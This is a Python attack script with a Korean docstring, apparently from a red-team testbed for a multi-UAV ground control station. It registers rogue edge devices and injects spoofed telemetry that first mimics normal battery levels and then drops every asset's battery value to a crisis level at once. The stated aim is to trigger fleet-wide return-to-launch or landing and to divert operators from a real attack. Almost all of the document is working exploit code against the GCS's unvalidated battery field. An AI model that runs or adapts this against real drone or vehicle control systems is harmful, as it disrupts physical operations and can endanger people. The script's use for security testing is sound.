"""
배터리 위기 동시 스푸핑 공격
독창 시나리오 #10 | IEEE AERO 2023 "Battery Spoofing in Multi-UAV Systems"

GCS 취약점: tracks_payload()가 battery_wh 값을 검증 없이 그대로 노출
  - track["battery_wh"] = primary["battery_wh"]
  - 임계값 체크나 rate-of-change 검증 없음

공격 전략:
  Phase 1 (정상 위장): 10틱 동안 정상 battery_wh 전송 → 신뢰 구축
  Phase 2 (급락):      한 틱 안에 모든 자산의 battery_wh를 1.0으로 급락
                       → 대시보드 배터리 경보 동시 발생
                       → GCS Fail-safe 정책: 전 자산 RTL/LAND 동시 발동 가능

결과:
  - 대시보드 전 자산 배터리 위기 경보 동시 발생
  - 운용자가 배터리 확인하러 실제 장비 점검 나가는 동안 진짜 공격 실행 가능
  - 복합 공격의 사전 교란(Diversion)으로 사용
"""
from __future__ import annotations

import argparse
import random
import time
from .common import GcsClient, wait_for_gcs


ASSET_BATTERY_NORMAL = {
    "small-dronebot-01":  690.0,
    "ground-convoy-01":   3725.0,
}
EDGE_MAP = {
    "small-dronebot-01": ("edge-attack-bat-01", "uav_edge"),
    "ground-convoy-01":  ("edge-attack-bat-02", "ugv_edge"),
}


def main(argv: list[str] | None = None) -> int:
    parser = argparse.ArgumentParser(description="배터리 위기 스푸핑 공격")
    parser.add_argument("--service-url",     default="http://dah-gcs:8080")
    parser.add_argument("--warmup-ticks",    type=int, default=8,
                        help="신뢰 구축 단계 틱 수 (정상 배터리 전송)")
    parser.add_argument("--crisis-battery",  type=float, default=1.5,
                        help="위기 배터리 값 (Wh)")
    parser.add_argument("--interval-s",      type=float, default=1.2)
    parser.add_argument("--duration-s",      type=float, default=80.0)
    args = parser.parse_args(argv)

    client = GcsClient(args.service_url)
    wait_for_gcs(client)

    # 공격 엣지 등록
    for asset_id, (edge_id, dtype) in EDGE_MAP.items():
        try:
            client.post("/api/edge/devices/register", {
                "edge_id":          edge_id,
                "device_type":      dtype,
                "asset_ids":        [asset_id],
                "authority":        "EXTERNAL-ATTACKER",
                "link_profiles":    ["rf_spoofed"],
                "software_version": "battery-spoof-0.1",
            })
        except Exception:
            pass

    start = time.time()
    tick = 0
    crisis_triggered = False

    print(
        f"[battery_crisis] 공격 시작\n"
        f"  Warmup: {args.warmup_ticks}틱 정상 배터리 전송\n"
        f"  Phase 2: battery_wh → {args.crisis_battery} Wh (전 자산 동시)",
        flush=True,
    )

    while (time.time() - start) < args.duration_s:
        is_warmup = tick < args.warmup_ticks

        for asset_id, normal_batt in ASSET_BATTERY_NORMAL.items():
            edge_id, dtype = EDGE_MAP[asset_id]
            pos_base = [200.0, -220.0, 95.0] if "dronebot" in asset_id else [150.0, -180.0, 12.0]

            # Phase 1: 정상 배터리로 신뢰 구축
            # Phase 2: 위기값으로 급락 (단계적 하락이 아닌 급락 → rate-of-change 이상)
            batt = normal_batt * (0.98 ** tick) if is_warmup else args.crisis_battery

            try:
                client.post("/api/telemetry/ingest", {
                    "asset_id":         asset_id,
                    "time_s":           tick,
                    "position":         [pos_base[0] + random.gauss(0, 1),
                                         pos_base[1] + random.gauss(0, 1),
                                         pos_base[2]],
                    "velocity_mps":     [14.0, 1.2, 0.0] if "dronebot" in asset_id else [5.5, 0.4, 0.0],
                    "heading_deg":      (tick * 10) % 360,
                    "status":           "edge-live",
                    "source":           "BATTERY-CRISIS",
                    "source_id":        edge_id,
                    "source_type":      dtype,
                    "source_authority": "EXTERNAL-ATTACKER",
                    "track_confidence": 0.85,
                    "link_profile":     "rf_spoofed",
                    "battery_wh":       round(batt, 1),
                })
            except Exception as e:
                print(f"[battery_crisis] 오류 {asset_id}: {e}", flush=True)

        if not is_warmup and not crisis_triggered:
            crisis_triggered = True
            print(
                f"\n[battery_crisis] ★★ 배터리 위기 주입! ★★ "
                f"전 자산 battery_wh={args.crisis_battery} Wh 전송\n",
                flush=True,
            )

        phase = "warmup" if is_warmup else "CRISIS"
        batt_display = ASSET_BATTERY_NORMAL["small-dronebot-01"] * (0.98 ** tick) if is_warmup else args.crisis_battery
        print(
            f"[battery_crisis] [{phase}] tick={tick:04d} | battery={batt_display:.1f} Wh",
            flush=True,
        )

        tick += 1
        time.sleep(args.interval_s)

    print("[battery_crisis] 공격 종료", flush=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
